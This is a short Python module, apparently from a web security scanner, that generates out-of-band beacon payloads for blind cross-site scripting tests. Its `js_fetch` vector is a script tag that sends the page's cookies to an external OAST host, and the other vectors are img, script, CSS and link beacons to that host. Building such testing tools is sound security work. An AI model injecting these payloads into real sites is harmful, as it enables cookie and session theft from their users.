from __future__ import annotations

import uuid
from typing import Dict, List

try:
    # Prefer base from config (can be env-injected there)
    from config import OAST_BASE_URL  # type: ignore
except Exception:
    # Fallback to utils OOB base
    from utils import OOB_BASE_URL as OAST_BASE_URL  # type: ignore


def generate_token() -> str:
    return uuid.uuid4().hex


def base_url() -> str:
    return (OAST_BASE_URL or "").rstrip("/")


def build_beacon_vectors(token: str) -> Dict[str, str]:
    """
    Return minimal OAST beacon payloads using various vectors. The OAST endpoint
    is expected to accept GET hits at `${base}/<token>` or `${base}/<token>.js`.
    """
    b = base_url()
    t = token.strip()

    # Core endpoints (try both /t and /t.js for compatibility)
    p_hit = f"{b}/{t}"
    p_js = f"{b}/{t}.js"

    return {
        # JS fetch beacon carrying cookies
        "js_fetch": (
            f"<script>try{{fetch('{p_hit}?c='+encodeURIComponent(document.cookie||''))}}catch(e){{}}</script>"
        ),
        # Script src (if server serves a JS)
        "script_src": f"<script src=\"{p_js}\"></script>",
        # IMG beacon
        "img": f"<img src=\"{p_hit}?i=1\">",
        # CSS background beacon
        "css_bg": f'<div style="background:url({p_hit}?bg=1)">x</div>',
        # LINK href beacon
        "link": f'<link rel="preconnect" href="{p_hit}?l=1">',
    }


def check_paths_for_poll(token: str) -> List[str]:
    """
    Return paths to poll for hit checks (server-dependent). Caller should try each.
    """
    b = base_url()
    t = token.strip()
    return [
        f"{b}/{t}.js?check=true",
        f"{b}/{t}?check=true",
    ]

